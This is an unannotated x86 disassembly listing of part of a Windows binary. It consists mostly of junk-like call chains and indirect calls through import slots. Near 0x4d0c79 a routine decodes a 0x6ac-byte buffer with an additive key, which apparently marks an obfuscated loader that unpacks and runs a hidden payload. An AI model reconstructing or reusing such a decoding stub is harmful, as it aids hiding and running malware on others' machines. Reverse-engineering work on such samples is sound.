  4d0792:	add    esp,0x4
  4d0795:	pop    edi
  4d0796:	push   edi
  4d0797:	push   edx
  4d0798:	push   edx
  4d0799:	push   edx
  4d079a:	call   0x4d0f54
  4d079f:	add    esp,0xc
  4d07a2:	pop    edi
  4d07a3:	push   edi
  4d07a4:	mov    ebx,0x0
  4d07a9:	push   ebx
  4d07aa:	call   0x4d08c8
  4d07af:	add    esp,0x4
  4d07b2:	pop    edi
  4d07b3:	add    esp,0x44
  4d07b6:	pop    ebp
  4d07b7:	ret    
  4d07b8:	mov    edi,edi
  4d07ba:	push   ebp
  4d07bb:	mov    ebp,esp
  4d07bd:	sub    esp,0x24
  4d07c0:	mov    ebx,0x4d310c
  4d07c5:	cmp    ebx,0x75ab
  4d07cb:	je     0x4d07bb
  4d07cd:	push   ebx
  4d07ce:	push   DWORD PTR [ebx+0x1e4]
  4d07d4:	push   edx
  4d07d5:	push   edx
  4d07d6:	call   0x4d0d74
  4d07db:	add    esp,0xc
  4d07de:	pop    ebx
  4d07df:	push   0x0
  4d07e1:	call   0x4d0d20
  4d07e6:	add    esp,0x4
  4d07e9:	mov    edx,0x0
  4d07ee:	push   edx
  4d07ef:	call   0x4d0960
  4d07f4:	add    esp,0x4
  4d07f7:	add    esp,0x24
  4d07fa:	pop    ebp
  4d07fb:	ret    
  4d07fc:	mov    edi,edi
  4d07fe:	push   ebp
  4d07ff:	mov    ebp,esp
  4d0801:	sub    esp,0x60
  4d0804:	mov    edx,0x4d30a4
  4d0809:	cmp    edx,0x585f
  4d080f:	jbe    0x4d07ff
  4d0811:	push   edx
  4d0812:	push   DWORD PTR [edx+0x1e4]
  4d0818:	push   esi
  4d0819:	call   0x4d07b8
  4d081e:	add    esp,0x8
  4d0821:	pop    edx
  4d0822:	push   edx
  4d0823:	lea    eax,[edx-0xa4]
  4d0829:	push   eax
  4d082a:	call   0x4d0fe0
  4d082f:	add    esp,0x4
  4d0832:	test   eax,eax
  4d0834:	jne    0x4d0823
  4d0836:	pop    edx
  4d0837:	mov    edi,0x4d2008
  4d083c:	mov    edi,DWORD PTR [edi]
  4d083e:	push   edi
  4d083f:	push   DWORD PTR [edx+0x5c]
  4d0842:	pop    eax
  4d0843:	call   eax
  4d0845:	add    esp,0x60
  4d0848:	pop    ebp
  4d0849:	ret    
  4d084a:	add    BYTE PTR [eax],al
  4d084c:	pop    edi
  4d084d:	call   DWORD PTR ds:0x4d2000
  4d0853:	call   edi
  4d0855:	add    BYTE PTR [eax],al
  4d0857:	add    BYTE PTR [edi-0x1],bl
  4d085a:	adc    eax,0x4d205c
  4d085f:	call   edi
  4d0861:	add    BYTE PTR [eax],al
  4d0863:	add    BYTE PTR [edi-0x1],bl
  4d0866:	adc    eax,0x4d2090
  4d086b:	call   edi
  4d086d:	add    BYTE PTR [eax],al
  4d086f:	add    BYTE PTR [edi-0x1],bl
  4d0872:	adc    eax,0x4d2058
  4d0877:	call   edi
  4d0879:	add    BYTE PTR [eax],al
  4d087b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0881:	sub    esp,0x50
  4d0884:	lea    edi,ds:0x4d3084
  4d088a:	xor    esi,DWORD PTR [ebp-0xc]
  4d088d:	push   edi
  4d088e:	push   DWORD PTR [edi+0x1dc]
  4d0894:	push   ebx
  4d0895:	push   DWORD PTR [edi+0x120]
  4d089b:	push   esi
  4d089c:	call   0x4d14d0
  4d08a1:	add    esp,0x10
  4d08a4:	pop    edi
  4d08a5:	push   edi
  4d08a6:	mov    eax,0x0
  4d08ab:	push   eax
  4d08ac:	call   0x4d12f4
  4d08b1:	add    esp,0x4
  4d08b4:	pop    edi
  4d08b5:	push   edi
  4d08b6:	push   0x0
  4d08b8:	call   0x4d0e14
  4d08bd:	add    esp,0x4
  4d08c0:	pop    edi
  4d08c1:	add    esp,0x50
  4d08c4:	pop    ebp
  4d08c5:	ret    
  4d08c6:	add    BYTE PTR [eax],al
  4d08c8:	pop    edi
  4d08c9:	call   DWORD PTR ds:0x4d2030
  4d08cf:	call   edi
  4d08d1:	add    BYTE PTR [eax],al
  4d08d3:	add    BYTE PTR [edi-0x1],bl
  4d08d6:	adc    eax,0x4d2018
  4d08db:	call   edi
  4d08dd:	add    BYTE PTR [eax],al
  4d08df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08e5:	sub    esp,0x2c
  4d08e8:	lea    ecx,ds:0x4d303c
  4d08ee:	and    ebx,DWORD PTR [ebp-0x14]
  4d08f1:	push   ecx
  4d08f2:	push   DWORD PTR [ecx+0x190]
  4d08f8:	push   esi
  4d08f9:	call   0x4d1074
  4d08fe:	add    esp,0x8
  4d0901:	pop    ecx
  4d0902:	push   ecx
  4d0903:	push   0x0
  4d0905:	call   0x4d0858
  4d090a:	add    esp,0x4
  4d090d:	pop    ecx
  4d090e:	push   ecx
  4d090f:	push   0x0
  4d0911:	call   0x4d08c8
  4d0916:	add    esp,0x4
  4d0919:	pop    ecx
  4d091a:	add    esp,0x2c
  4d091d:	pop    ebp
  4d091e:	ret    
  4d091f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0925:	sub    esp,0x48
  4d0928:	lea    esi,ds:0x4d30ec
  4d092e:	or     edx,DWORD PTR [esi+0xe8]
  4d0934:	mov    edi,0x0
  4d0939:	push   edi
  4d093a:	call   0x4d0960
  4d093f:	add    esp,0x4
  4d0942:	push   esi
  4d0943:	push   ecx
  4d0944:	push   DWORD PTR [esi+0x38]
  4d0947:	call   0x4d1564
  4d094c:	add    esp,0x8
  4d094f:	pop    esi
  4d0950:	call   0x4d084c
  4d0955:	add    esp,0x4
  4d0958:	add    esp,0x48
  4d095b:	pop    ebp
  4d095c:	ret    
  4d095d:	add    BYTE PTR [eax],al
  4d095f:	add    BYTE PTR [edi-0x1],bl
  4d0962:	adc    eax,0x4d206c
  4d0967:	call   edi
  4d0969:	add    BYTE PTR [eax],al
  4d096b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0971:	sub    esp,0x48
  4d0974:	lea    ecx,[edi-0x94]
  4d097a:	sub    DWORD PTR [ecx+0x12c],0xfffffff8
  4d0981:	push   ecx
  4d0982:	push   edi
  4d0983:	push   DWORD PTR [ecx+0x28]
  4d0986:	call   0x4d1288
  4d098b:	add    esp,0x8
  4d098e:	pop    ecx
  4d098f:	push   ecx
  4d0990:	push   0x0
  4d0992:	call   0x4d0d20
  4d0997:	add    esp,0x4
  4d099a:	pop    ecx
  4d099b:	push   ecx
  4d099c:	mov    edi,0x0
  4d09a1:	push   edi
  4d09a2:	call   0x4d0a90
  4d09a7:	add    esp,0x4
  4d09aa:	pop    ecx
  4d09ab:	add    esp,0x48
  4d09ae:	pop    ebp
  4d09af:	ret    
  4d09b0:	mov    edi,edi
  4d09b2:	push   ebp
  4d09b3:	mov    ebp,esp
  4d09b5:	sub    esp,0x2c
  4d09b8:	lea    edi,[eax-0x18c]
  4d09be:	xor    DWORD PTR [edi+0x13c],0xfffffffb
  4d09c5:	push   edi
  4d09c6:	push   0x0
  4d09c8:	call   0x4d0a90
  4d09cd:	add    esp,0x4
  4d09d0:	pop    edi
  4d09d1:	push   edi
  4d09d2:	push   DWORD PTR [edi+0xf4]
  4d09d8:	push   DWORD PTR [edi+0xac]
  4d09de:	push   DWORD PTR [edi+0x30]
  4d09e1:	push   DWORD PTR [edi+0x150]
  4d09e7:	call   0x4d1418
  4d09ec:	add    esp,0x10
  4d09ef:	pop    edi
  4d09f0:	push   edi
  4d09f1:	mov    eax,0x0
  4d09f6:	push   eax
  4d09f7:	call   0x4d0a90
  4d09fc:	add    esp,0x4
  4d09ff:	pop    edi
  4d0a00:	add    esp,0x2c
  4d0a03:	pop    ebp
  4d0a04:	ret    
  4d0a05:	add    BYTE PTR [eax],al
  4d0a07:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a0d:	sub    esp,0x1c
  4d0a10:	lea    esi,ds:0x4d3134
  4d0a16:	sub    ecx,DWORD PTR [esi-0xec]
  4d0a1c:	push   esi
  4d0a1d:	push   ebx
  4d0a1e:	push   edx
  4d0a1f:	push   DWORD PTR [esi+0xe8]
  4d0a25:	push   DWORD PTR [esi+0x80]
  4d0a2b:	call   0x4d0ae4
  4d0a30:	add    esp,0x10
  4d0a33:	pop    esi
  4d0a34:	push   0x0
  4d0a36:	call   0x4d0f48
  4d0a3b:	add    esp,0x4
  4d0a3e:	push   0x0
  4d0a40:	call   0x4d12f4
  4d0a45:	add    esp,0x4
  4d0a48:	add    esp,0x1c
  4d0a4b:	pop    ebp
  4d0a4c:	ret    
  4d0a4d:	add    BYTE PTR [eax],al
  4d0a4f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a55:	sub    esp,0x58
  4d0a58:	mov    edx,0x4d3174
  4d0a5d:	or     ecx,DWORD PTR [ebp-0x34]
  4d0a60:	push   edx
  4d0a61:	push   eax
  4d0a62:	push   eax
  4d0a63:	push   DWORD PTR [edx+0x40]
  4d0a66:	push   DWORD PTR [edx+0x1a4]
  4d0a6c:	call   0x4d137c
  4d0a71:	add    esp,0x10
  4d0a74:	pop    edx
  4d0a75:	push   edx
  4d0a76:	push   0x0
  4d0a78:	call   0x4d0858
  4d0a7d:	add    esp,0x4
  4d0a80:	pop    edx
  4d0a81:	push   edx
  4d0a82:	call   0x4d0d14
  4d0a87:	add    esp,0x4
  4d0a8a:	pop    edx
  4d0a8b:	add    esp,0x58
  4d0a8e:	pop    ebp
  4d0a8f:	ret    
  4d0a90:	pop    edi
  4d0a91:	call   DWORD PTR ds:0x4d2034
  4d0a97:	call   edi
  4d0a99:	add    BYTE PTR [eax],al
  4d0a9b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0aa1:	sub    esp,0x20
  4d0aa4:	lea    ebx,ds:0x4d3034
  4d0aaa:	xor    DWORD PTR [ebx+0x70],edx
  4d0aad:	call   0x4d0d14
  4d0ab2:	add    esp,0x4
  4d0ab5:	push   ebx
  4d0ab6:	push   DWORD PTR [ebx+0x94]
  4d0abc:	push   DWORD PTR [ebx+0x1c8]
  4d0ac2:	push   DWORD PTR [ebx+0x158]
  4d0ac8:	push   eax
  4d0ac9:	call   0x4d0730
  4d0ace:	add    esp,0x10
  4d0ad1:	pop    ebx
  4d0ad2:	push   0x0
  4d0ad4:	call   0x4d12e8
  4d0ad9:	add    esp,0x4
  4d0adc:	add    esp,0x20
  4d0adf:	pop    ebp
  4d0ae0:	ret    
  4d0ae1:	add    BYTE PTR [eax],al
  4d0ae3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ae9:	sub    esp,0x3c
  4d0aec:	lea    edx,ds:0x4d3168
  4d0af2:	adc    eax,DWORD PTR [ebp-0x14]
  4d0af5:	push   edx
  4d0af6:	call   0x4d084c
  4d0afb:	add    esp,0x4
  4d0afe:	pop    edx
  4d0aff:	push   edx
  4d0b00:	push   ecx
  4d0b01:	push   DWORD PTR [edx+0xd0]
  4d0b07:	call   0x4d0ef8
  4d0b0c:	add    esp,0x8
  4d0b0f:	pop    edx
  4d0b10:	push   edx
  4d0b11:	call   0x4d084c
  4d0b16:	add    esp,0x4
  4d0b19:	pop    edx
  4d0b1a:	add    esp,0x3c
  4d0b1d:	pop    ebp
  4d0b1e:	ret    
  4d0b1f:	add    BYTE PTR [edi-0x1],bl
  4d0b22:	adc    eax,0x4d2060
  4d0b27:	call   edi
  4d0b29:	add    BYTE PTR [eax],al
  4d0b2b:	add    BYTE PTR [edi-0x1],bl
  4d0b2e:	adc    eax,0x4d2028
  4d0b33:	call   edi
  4d0b35:	add    BYTE PTR [eax],al
  4d0b37:	add    BYTE PTR [edi-0x1],bl
  4d0b3a:	adc    eax,0x4d2010
  4d0b3f:	call   edi
  4d0b41:	add    BYTE PTR [eax],al
  4d0b43:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b49:	sub    esp,0x5c
  4d0b4c:	mov    ecx,0x4d3040
  4d0b51:	mov    eax,DWORD PTR [ebp-0x28]
  4d0b54:	push   ecx
  4d0b55:	push   edx
  4d0b56:	push   DWORD PTR [ecx+0x24]
  4d0b59:	push   DWORD PTR [ecx+0x160]
  4d0b5f:	call   0x4d0e74
  4d0b64:	add    esp,0xc
  4d0b67:	pop    ecx
  4d0b68:	push   ecx
  4d0b69:	call   0x4d0d14
  4d0b6e:	add    esp,0x4
  4d0b71:	pop    ecx
  4d0b72:	push   ecx
  4d0b73:	mov    ebx,0x0
  4d0b78:	push   ebx
  4d0b79:	call   0x4d14b8
  4d0b7e:	add    esp,0x4
  4d0b81:	pop    ecx
  4d0b82:	add    esp,0x5c
  4d0b85:	pop    ebp
  4d0b86:	ret    
  4d0b87:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b8d:	sub    esp,0x2c
  4d0b90:	lea    esi,ds:0x4d3100
  4d0b96:	xor    eax,DWORD PTR [esi+0x48]
  4d0b99:	push   esi
  4d0b9a:	push   DWORD PTR [esi+0x170]
  4d0ba0:	push   ebx
  4d0ba1:	push   DWORD PTR [esi+0x1dc]
  4d0ba7:	call   0x4d0a9c
  4d0bac:	add    esp,0xc
  4d0baf:	pop    esi
  4d0bb0:	push   0xfffffff4
  4d0bb2:	call   0x4d0b2c
  4d0bb7:	add    esp,0x4
  4d0bba:	push   0x0
  4d0bbc:	call   0x4d08c8
  4d0bc1:	add    esp,0x4
  4d0bc4:	add    esp,0x2c
  4d0bc7:	pop    ebp
  4d0bc8:	ret    
  4d0bc9:	add    BYTE PTR [eax],al
  4d0bcb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bd1:	sub    esp,0x48
  4d0bd4:	lea    ecx,[ebx-0x18]
  4d0bd7:	adc    DWORD PTR [ebp-0x18],edx
  4d0bda:	push   ecx
  4d0bdb:	mov    edi,0x0
  4d0be0:	push   edi
  4d0be1:	call   0x4d0a90
  4d0be6:	add    esp,0x4
  4d0be9:	pop    ecx
  4d0bea:	push   ecx
  4d0beb:	push   edi
  4d0bec:	push   DWORD PTR [ecx+0x188]
  4d0bf2:	push   DWORD PTR [ecx+0x19c]
  4d0bf8:	push   esi
  4d0bf9:	call   0x4d0a50
  4d0bfe:	add    esp,0x10
  4d0c01:	pop    ecx
  4d0c02:	push   ecx
  4d0c03:	push   0x0
  4d0c05:	call   0x4d12e8
  4d0c0a:	add    esp,0x4
  4d0c0d:	pop    ecx
  4d0c0e:	add    esp,0x48
  4d0c11:	pop    ebp
  4d0c12:	ret    
  4d0c13:	add    BYTE PTR [edi-0x1],bl
  4d0c16:	adc    eax,0x4d207c
  4d0c1b:	call   edi
  4d0c1d:	add    BYTE PTR [eax],al
  4d0c1f:	add    BYTE PTR [edi+0x2b],dl
  4d0c22:	call   DWORD PTR [edi+0x57]
  4d0c25:	push   edi
  4d0c26:	push   edi
  4d0c27:	call   0x4d0c68
  4d0c2c:	sub    esp,0xfffffffc
  4d0c2f:	call   0x4d0b38
  4d0c34:	push   0x2
  4d0c36:	xor    eax,eax
  4d0c38:	sub    eax,0x4d3030
  4d0c3d:	neg    eax
  4d0c3f:	push   0x0
  4d0c41:	lea    ecx,[eax+0x6]
  4d0c44:	add    BYTE PTR [ecx],0x41
  4d0c47:	push   eax
  4d0c48:	call   0x4d1300
  4d0c4d:	pop    edi
  4d0c4e:	pop    edi
  4d0c4f:	pop    edi
  4d0c50:	lea    ecx,[eax+0x3b]
  4d0c53:	mov    edi,DWORD PTR [ecx]
  4d0c55:	lea    eax,[eax+edi*1]
  4d0c58:	mov    eax,DWORD PTR [eax+0x28]
  4d0c5b:	pusha  
  4d0c5c:	mov    ah,0x45
  4d0c5e:	sub    al,ah
  4d0c60:	ja     0x4d07fc
  4d0c66:	popa   
  4d0c67:	ret    
  4d0c68:	pop    edi
  4d0c69:	call   DWORD PTR ds:0x4d2020
  4d0c6f:	call   edi
  4d0c71:	add    BYTE PTR [eax],al
  4d0c73:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c79:	sub    esp,0x24
  4d0c7c:	add    DWORD PTR [edx+0xf0],edx
  4d0c82:	lea    edi,ds:0x4d318c
  4d0c88:	push   edi
  4d0c89:	mov    ecx,0x6ac
  4d0c8e:	push   ecx
  4d0c8f:	mov    eax,0x6ac
  4d0c94:	push   eax
  4d0c95:	mov    edi,0x40001
  4d0c9a:	push   edi
  4d0c9b:	mov    ecx,0x862985b2
  4d0ca0:	push   DWORD PTR [ecx+0x7a239a86]
  4d0ca6:	sub    DWORD PTR [esp],0x2
  4d0caa:	mov    ecx,0x4d2040
  4d0caf:	pop    DWORD PTR [ecx]
  4d0cb1:	call   0x4d1300
  4d0cb6:	add    esp,0x4
  4d0cb9:	xchg   DWORD PTR [esp],eax
  4d0cbc:	mov    edi,eax
  4d0cbe:	pop    DWORD PTR [edi-0x8c]
  4d0cc4:	mov    ecx,DWORD PTR [edi-0x8c]
  4d0cca:	mov    eax,ecx
  4d0ccc:	sub    ecx,ecx
  4d0cce:	dec    ecx
  4d0ccf:	and    ecx,0x4d0014
  4d0cd5:	mov    ebx,0x7ec7f445
  4d0cda:	xor    edx,edx
  4d0cdc:	cmp    edx,0x6ac
  4d0ce2:	je     0x4d0d00
  4d0ce4:	sub    edx,0xfffffffc
  4d0ce7:	xor    esi,esi
  4d0ce9:	push   DWORD PTR [ecx+esi*1]
  4d0cec:	add    DWORD PTR [esp],ebx
  4d0cef:	pop    DWORD PTR [eax+esi*2]
  4d0cf2:	dec    DWORD PTR [eax]
  4d0cf4:	xor    ebx,ebx
  4d0cf6:	add    ebx,DWORD PTR [ecx]
  4d0cf8:	add    ecx,0x4
  4d0cfb:	add    eax,0x4
  4d0cfe:	jmp    0x4d0cdc
  4d0d00:	push   edi
  4d0d01:	push   0x0
  4d0d03:	call   0x4d08c8
  4d0d08:	add    esp,0x4
  4d0d0b:	pop    edi
  4d0d0c:	add    esp,0x24
  4d0d0f:	pop    ebp
  4d0d10:	ret    
  4d0d11:	add    BYTE PTR [eax],al
  4d0d13:	add    BYTE PTR [edi-0x1],bl
  4d0d16:	adc    eax,0x4d2024
  4d0d1b:	call   edi
  4d0d1d:	add    BYTE PTR [eax],al
  4d0d1f:	add    BYTE PTR [edi-0x1],bl
  4d0d22:	adc    eax,0x4d202c
  4d0d27:	call   edi
  4d0d29:	add    BYTE PTR [eax],al
  4d0d2b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d31:	sub    esp,0x40
  4d0d34:	lea    eax,ds:0x4d3008
  4d0d3a:	sub    esi,ebx
  4d0d3c:	push   eax
  4d0d3d:	push   DWORD PTR [eax+0x54]
  4d0d40:	push   DWORD PTR [eax+0x190]
  4d0d46:	push   edx
  4d0d47:	push   edi
  4d0d48:	call   0x4d0fec
  4d0d4d:	add    esp,0x10
  4d0d50:	pop    eax
  4d0d51:	push   eax
  4d0d52:	mov    ebx,0x0
  4d0d57:	push   ebx
  4d0d58:	call   0x4d0f48
  4d0d5d:	add    esp,0x4
  4d0d60:	pop    eax
  4d0d61:	push   eax
  4d0d62:	push   0x0
  4d0d64:	call   0x4d0d20
  4d0d69:	add    esp,0x4
  4d0d6c:	pop    eax
  4d0d6d:	add    esp,0x40
  4d0d70:	pop    ebp
  4d0d71:	ret    
  4d0d72:	add    BYTE PTR [eax],al
  4d0d74:	mov    edi,edi
  4d0d76:	push   ebp
  4d0d77:	mov    ebp,esp
  4d0d79:	sub    esp,0x28
  4d0d7c:	mov    edx,0x4d3084
  4d0d81:	cmp    edx,0x707b
  4d0d87:	jbe    0x4d0d77
  4d0d89:	push   edx
  4d0d8a:	mov    ebx,0x0
  4d0d8f:	push   ebx
  4d0d90:	call   0x4d08c8
  4d0d95:	add    esp,0x4
  4d0d98:	pop    edx
  4d0d99:	push   edx
  4d0d9a:	push   DWORD PTR [edx+0x84]
  4d0da0:	push   DWORD PTR [edx+0xd4]
  4d0da6:	push   DWORD PTR [edx+0x7c]
  4d0da9:	call   0x4d087c
  4d0dae:	add    esp,0xc
  4d0db1:	pop    edx
  4d0db2:	push   edx
  4d0db3:	push   0x0
  4d0db5:	call   0x4d12f4
  4d0dba:	add    esp,0x4
  4d0dbd:	pop    edx
  4d0dbe:	add    esp,0x28
  4d0dc1:	pop    ebp
  4d0dc2:	ret    
  4d0dc3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0dc9:	sub    esp,0x40
  4d0dcc:	lea    esi,ds:0x4d305c
  4d0dd2:	adc    eax,DWORD PTR [esi+0x184]
  4d0dd8:	push   0xfffffff4
  4d0dda:	call   0x4d0b2c
  4d0ddf:	add    esp,0x4
  4d0de2:	push   esi
  4d0de3:	push   DWORD PTR [esi+0xdc]
  4d0de9:	push   DWORD PTR [esi+0xe8]
  4d0def:	push   eax
  4d0df0:	push   DWORD PTR [esi+0xc0]
  4d0df6:	call   0x4d1158
  4d0dfb:	add    esp,0x10
  4d0dfe:	pop    esi
  4d0dff:	mov    edi,0x0
  4d0e04:	push   edi
  4d0e05:	call   0x4d0960
  4d0e0a:	add    esp,0x4
  4d0e0d:	add    esp,0x40
  4d0e10:	pop    ebp
  4d0e11:	ret    
  4d0e12:	add    BYTE PTR [eax],al
  4d0e14:	pop    edi
  4d0e15:	call   DWORD PTR ds:0x4d201c
  4d0e1b:	call   edi
  4d0e1d:	add    BYTE PTR [eax],al
  4d0e1f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e25:	sub    esp,0x5c
  4d0e28:	mov    edi,0x4d30ec
  4d0e2d:	add    eax,0x42a2
  4d0e32:	push   edi
  4d0e33:	push   eax
  4d0e34:	push   DWORD PTR [edi+0x10]
  4d0e37:	push   DWORD PTR [edi+0x1ac]
  4d0e3d:	call   0x4d1238
  4d0e42:	add    esp,0xc
  4d0e45:	pop    edi
  4d0e46:	push   edi
  4d0e47:	push   0x0
  4d0e49:	call   0x4d14b8
  4d0e4e:	add    esp,0x4
  4d0e51:	pop    edi
  4d0e52:	push   edi
  4d0e53:	mov    eax,0xfffffff4
  4d0e58:	push   eax
  4d0e59:	call   0x4d0b2c
  4d0e5e:	add    esp,0x4
  4d0e61:	pop    edi
  4d0e62:	add    esp,0x5c
  4d0e65:	pop    ebp
  4d0e66:	ret    
  4d0e67:	add    BYTE PTR [edi-0x1],bl
  4d0e6a:	adc    eax,0x4d2068
  4d0e6f:	call   edi
  4d0e71:	add    BYTE PTR [eax],al
  4d0e73:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e79:	sub    esp,0x44
  4d0e7c:	lea    eax,ds:0x4d31fc
  4d0e82:	mov    edi,0xffffffa4
  4d0e87:	push   eax
  4d0e88:	call   0x4d084c
  4d0e8d:	add    esp,0x4
  4d0e90:	pop    eax
  4d0e91:	push   eax
  4d0e92:	push   esi
  4d0e93:	push   DWORD PTR [eax+0x1a0]
  4d0e99:	call   0x4d06ec
  4d0e9e:	add    esp,0x8
  4d0ea1:	pop    eax
  4d0ea2:	push   eax
  4d0ea3:	lea    ebx,[eax-0x1fc]
  4d0ea9:	push   ebx
  4d0eaa:	call   0x4d0fe0
  4d0eaf:	add    esp,0x4
  4d0eb2:	test   eax,eax
  4d0eb4:	jne    0x4d0ea3
  4d0eb6:	pop    eax
  4d0eb7:	add    esp,0x44
  4d0eba:	pop    ebp
  4d0ebb:	ret    
  4d0ebc:	mov    edi,edi
  4d0ebe:	push   ebp
  4d0ebf:	mov    ebp,esp
  4d0ec1:	sub    esp,0x20
  4d0ec4:	mov    esi,0x4d31d8
  4d0ec9:	mov    edi,DWORD PTR [ebp-0x4]
  4d0ecc:	push   esi
  4d0ecd:	push   ecx
  4d0ece:	push   DWORD PTR [esi+0x170]
  4d0ed4:	push   ebx
  4d0ed5:	call   0x4d13e4
  4d0eda:	add    esp,0xc
  4d0edd:	pop    esi
  4d0ede:	push   0x0
  4d0ee0:	call   0x4d0960
  4d0ee5:	add    esp,0x4
  4d0ee8:	call   0x4d0d14
  4d0eed:	add    esp,0x4
  4d0ef0:	add    esp,0x20
  4d0ef3:	pop    ebp
  4d0ef4:	ret    
  4d0ef5:	add    BYTE PTR [eax],al
  4d0ef7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0efd:	sub    esp,0x5c
  4d0f00:	lea    edi,[edx-0x13c]
  4d0f06:	add    DWORD PTR [ebp-0x5c],esi
  4d0f09:	push   edi
  4d0f0a:	push   DWORD PTR [edi+0x94]
  4d0f10:	push   edx
  4d0f11:	push   edx
  4d0f12:	call   0x4d1470
  4d0f17:	add    esp,0xc
  4d0f1a:	pop    edi
  4d0f1b:	push   edi
  4d0f1c:	push   0x0
  4d0f1e:	call   0x4d0a90
  4d0f23:	add    esp,0x4
  4d0f26:	pop    edi
  4d0f27:	push   edi
  4d0f28:	mov    ebx,0x0
  4d0f2d:	push   ebx
  4d0f2e:	call   0x4d0960
  4d0f33:	add    esp,0x4
  4d0f36:	pop    edi
  4d0f37:	add    esp,0x5c
  4d0f3a:	pop    ebp
  4d0f3b:	ret    
  4d0f3c:	pop    edi
  4d0f3d:	call   DWORD PTR ds:0x4d2088
  4d0f43:	call   edi
  4d0f45:	add    BYTE PTR [eax],al
  4d0f47:	add    BYTE PTR [edi-0x1],bl
  4d0f4a:	adc    eax,0x4d2004
  4d0f4f:	call   edi
  4d0f51:	add    BYTE PTR [eax],al
  4d0f53:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f59:	sub    esp,0x48
  4d0f5c:	lea    ecx,ds:0x4d3108
  4d0f62:	sbb    edx,edi
  4d0f64:	push   ecx
  4d0f65:	push   DWORD PTR [ecx+0x1fc]
  4d0f6b:	push   DWORD PTR [ecx+0x118]
  4d0f71:	call   0x4d0e20
  4d0f76:	add    esp,0x8
  4d0f79:	pop    ecx
  4d0f7a:	push   ecx
  4d0f7b:	mov    esi,0x0
  4d0f80:	push   esi
  4d0f81:	call   0x4d08c8
  4d0f86:	add    esp,0x4
  4d0f89:	pop    ecx
  4d0f8a:	push   ecx
  4d0f8b:	push   0x0
  4d0f8d:	call   0x4d0e14
  4d0f92:	add    esp,0x4
  4d0f95:	pop    ecx
  4d0f96:	add    esp,0x48
  4d0f99:	pop    ebp
  4d0f9a:	ret    
  4d0f9b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fa1:	sub    esp,0x48
  4d0fa4:	lea    edx,ds:0x4d3014
  4d0faa:	or     DWORD PTR [edx+0x34],eax
  4d0fad:	push   edx
  4d0fae:	call   0x4d084c
  4d0fb3:	add    esp,0x4
  4d0fb6:	pop    edx
  4d0fb7:	push   edx
  4d0fb8:	push   DWORD PTR [edx+0x1c8]
  4d0fbe:	push   ebx
  4d0fbf:	push   DWORD PTR [edx+0xf0]
  4d0fc5:	push   esi
  4d0fc6:	call   0x4d0920
  4d0fcb:	add    esp,0x10
  4d0fce:	pop    edx
  4d0fcf:	push   edx
  4d0fd0:	push   0xfffffff4
  4d0fd2:	call   0x4d0b2c
  4d0fd7:	add    esp,0x4
  4d0fda:	pop    edx
  4d0fdb:	add    esp,0x48
  4d0fde:	pop    ebp
  4d0fdf:	ret    
  4d0fe0:	pop    edi
  4d0fe1:	call   DWORD PTR ds:0x4d2008
  4d0fe7:	call   edi
  4d0fe9:	add    BYTE PTR [eax],al
  4d0feb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ff1:	sub    esp,0x40
  4d0ff4:	lea    edx,ds:0x4d305c
  4d0ffa:	add    DWORD PTR [edx+0xfc],eax
  4d1000:	push   edx
  4d1001:	push   ebx
  4d1002:	push   DWORD PTR [edx+0x6c]
  4d1005:	push   esi
  4d1006:	push   eax
  4d1007:	call   0x4d0ebc
  4d100c:	add    esp,0x10
  4d100f:	pop    edx
  4d1010:	push   edx
  4d1011:	mov    esi,0x0
  4d1016:	push   esi
  4d1017:	call   0x4d0960
  4d101c:	add    esp,0x4
  4d101f:	pop    edx
  4d1020:	push   edx
  4d1021:	push   0x0
  4d1023:	call   0x4d0960
  4d1028:	add    esp,0x4
  4d102b:	pop    edx
  4d102c:	add    esp,0x40
  4d102f:	pop    ebp
  4d1030:	ret    
  4d1031:	add    BYTE PTR [eax],al
  4d1033:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1039:	sub    esp,0x50
  4d103c:	lea    edi,[ebx+0x14]
  4d103f:	add    ecx,edx
  4d1041:	push   edi
  4d1042:	push   DWORD PTR [edi+0xe4]
  4d1048:	push   eax
  4d1049:	push   DWORD PTR [edi+0xe0]
  4d104f:	call   0x4d1324
  4d1054:	add    esp,0xc
  4d1057:	pop    edi
  4d1058:	push   edi
  4d1059:	push   0x0
  4d105b:	call   0x4d12e8
  4d1060:	add    esp,0x4
  4d1063:	pop    edi
  4d1064:	push   edi
  4d1065:	call   0x4d084c
  4d106a:	add    esp,0x4
  4d106d:	pop    edi
  4d106e:	add    esp,0x50
  4d1071:	pop    ebp
  4d1072:	ret    
  4d1073:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1079:	sub    esp,0x4c
  4d107c:	lea    eax,ds:0x4d31a8
  4d1082:	mov    DWORD PTR [ebp-0x48],ecx
  4d1085:	push   eax
  4d1086:	push   0x0
  4d1088:	call   0x4d0960
  4d108d:	add    esp,0x4
  4d1090:	pop    eax
  4d1091:	push   eax
  4d1092:	push   edi
  4d1093:	push   DWORD PTR [eax+0x1f8]
  4d1099:	call   0x4d09b0
  4d109e:	add    esp,0x8
  4d10a1:	pop    eax
  4d10a2:	push   eax
  4d10a3:	push   0x0
  4d10a5:	call   0x4d0858
  4d10aa:	add    esp,0x4
  4d10ad:	pop    eax
  4d10ae:	add    esp,0x4c
  4d10b1:	pop    ebp
  4d10b2:	ret    
  4d10b3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10b9:	sub    esp,0x30
  4d10bc:	mov    ecx,0x4d316c
